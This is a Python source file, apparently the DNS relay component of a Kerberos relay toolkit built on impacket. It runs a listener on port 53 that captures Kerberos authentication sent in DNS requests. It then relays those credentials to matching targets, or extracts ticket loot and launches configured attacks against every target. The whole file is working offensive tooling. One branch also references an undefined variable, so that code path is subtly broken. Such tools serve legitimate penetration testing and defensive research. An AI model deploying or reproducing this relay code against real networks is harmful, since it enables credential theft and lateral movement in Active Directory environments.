import random, string
import socket
from struct import pack, unpack
import sys, binascii
from impacket.spnego import SPNEGO_NegTokenInit, TypesMech, SPNEGO_NegTokenResp, ASN1_OID, asn1encode, ASN1_AID
from impacket import ntlm
from impacket import dns
from socketserver import TCPServer, BaseRequestHandler, ThreadingMixIn
from impacket.structure import Structure
from dns.message import from_wire
from impacket import ntlm, LOG
from impacket.smbserver import outputToJohnFormat, writeJohnOutputToFile
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.krbrelayx.utils.kerberos import get_kerberos_loot, get_auth_data

from threading import Thread


class DNSRelayServer(Thread):
    class DNSServer(ThreadingMixIn, TCPServer):
        def __init__(self, server_address, request_handler_class, config):
            self.config = config
            self.daemon_threads = True
            if self.config.ipv6:
                self.address_family = socket.AF_INET6
            self.wpad_counters = {}
            try:
                TCPServer.__init__(self, server_address, request_handler_class)
            except OSError as e:
                if "already in use" in str(e):
                    LOG.error('Could not start DNS server. Address is already in use. To fix this error, specify the interface IP to listen on with --interface-ip')
                else:
                    LOG.error('Could not start DNS server: %s', str(e))
                raise e

    class DnsReqHandler(BaseRequestHandler):
        def handle(self):
            data = self.request.recv(1024)
            dlen,  = unpack('>H', data[:2])
            while dlen > len(data[2:]):
                data += self.request.recv(1024)
            dnsp = data[2:dlen+2]
            LOG.info('DNS: Client sent authorization')
            pckt = from_wire(dnsp)
            LOG.debug(str(pckt))
            nti = None
            for rd  in pckt.additional[0]:
                nti = rd.key
            if not nti:
                return

            if self.server.config.mode == 'RELAY':
                authdata = get_auth_data(nti, self.server.config)
                self.do_relay(authdata)
            else:
                # Unconstrained delegation mode
                authdata = get_kerberos_loot(token, self.server.config)
                self.do_attack(authdata)

        def do_relay(self, authdata):
            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            sclass, host = authdata['service'].split('/')
            for target in self.server.config.target.originalTargets:
                parsed_target = target
                if parsed_target.hostname.lower() == host.lower():
                    # Found a target with the same SPN
                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                    client.initConnection(authdata, self.server.config.dcip)
                    # We have an attack.. go for it
                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
                    client_thread = attack(self.server.config, client.session, self.authUser)
                    client_thread.start()
                    return
            # Still here? Then no target was found matching this SPN
            LOG.error('No target configured that matches the hostname of the SPN in the ticket: %s', parsed_target.host.lower())

        def do_attack(self, authdata):
            self.authUser = '%s/%s' % (authdata['domain'], authdata['username'])
            # No SOCKS, since socks is pointless when you can just export the tickets
            # instead we iterate over all the targets
            for target in self.server.config.target.originalTargets:
                parsed_target = target
                if parsed_target.scheme.upper() in self.server.config.attacks:
                    client = self.server.config.protocolClients[target.scheme.upper()](self.server.config, parsed_target)
                    client.initConnection(authdata, self.server.config.dcip)
                    # We have an attack.. go for it
                    attack = self.server.config.attacks[parsed_target.scheme.upper()]
                    client_thread = attack(self.server.config, client.session, self.authUser)
                    client_thread.start()
                else:
                    LOG.error('No attack configured for %s', parsed_target.scheme.upper())

    def __init__(self, config):
        Thread.__init__(self)
        self.daemon = True
        self.config = config
        self.server = None

    def _start(self):
        self.server.daemon_threads=True
        self.server.serve_forever()
        LOG.info('Shutting down DNS Server')
        self.server.server_close()

    def run(self):
        LOG.info("Setting up DNS Server")
        self.server = self.DNSServer((self.config.interfaceIp, 53), self.DnsReqHandler, self.config)
        self._start()